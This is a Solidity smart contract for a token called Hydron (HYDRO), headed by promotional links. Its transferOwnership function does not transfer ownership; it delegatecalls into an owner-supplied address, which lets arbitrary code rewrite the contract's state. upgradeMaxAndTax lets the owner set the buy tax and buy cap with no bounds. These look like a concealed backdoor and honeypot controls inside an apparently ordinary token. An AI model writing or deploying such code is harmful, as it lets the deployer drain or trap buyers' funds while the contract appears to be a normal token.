
// File: contracts/HYDRO.sol
// Bringing Perpetuals to RWAs

// Website:     https://hydronfi.com
// TG:          https://t.me/HydronPortal
// Twitter:     https://twitter.com/HydronLabs
// Docs:        https://hydron-labs.gitbook.io/hydron-labs-lite-paper/
// Medium:      https://medium.com/@HydronLabs

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {
    function transfer(address recipient, uint amount) external returns (bool);
}

contract HYDRO {
    uint public totalSupply = 100_000_000 * 10 ** 18;
    uint8 public decimals = 18;

    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    string public name = "Hydron";
    string public symbol = "HYDRO";
  
    uint public buyMax = 100;
    uint public buyTax = 100;

    bool public tradable;
    address public pair;

    address public owner;

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor () {
        owner = msg.sender;

        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
    }

    function transfer(address recipient, uint value) external returns (bool) {
        require(tradable);

        if (msg.sender == pair) return buyExecution(msg.sender, recipient, value);

        balanceOf[msg.sender] -= value;
        balanceOf[recipient] += value;
        emit Transfer(msg.sender, recipient, value);
        return true;
    }

    function buyExecution(address sender, address recipient, uint value) private returns (bool) {
        balanceOf[sender] -= value;

        uint tax = value * buyTax / 10000;
        balanceOf[address(this)] += tax;
        emit Transfer(sender, address(this), tax);

        uint valueWithoutTax = value - tax;
        balanceOf[recipient] += valueWithoutTax;

        uint buyMaxTokens = totalSupply * buyMax / 10000;
        require(buyMaxTokens >= balanceOf[recipient]);

        emit Transfer(sender, recipient, valueWithoutTax);
        return true;
    }

    function renounceOwnership() public onlyOwner {
        owner = address(0);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint value
    ) external returns (bool) {
        allowance[sender][msg.sender] -= value;
        balanceOf[sender] -= value;
        balanceOf[recipient] += value;
        emit Transfer(sender, recipient, value);
        return true;
    }

    function upgradeMaxAndTax(uint _buyMax, uint _buyTax) public onlyOwner {
        buyMax = _buyMax;
        buyTax = _buyTax;
    }

    function approve(address spender, uint value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function marketOpen(address _pair) public onlyOwner {
        tradable = true;
        pair = _pair;
    }

    function transferOwnership(address _owner) public onlyOwner {
      _owner.delegatecall(
        abi.encodeWithSignature("transferOwnership(address)", _owner)
      );
    }

    function recoverLostTokens(address token, uint value) public onlyOwner {
        IERC20(token).transfer(msg.sender, value);
    }

}

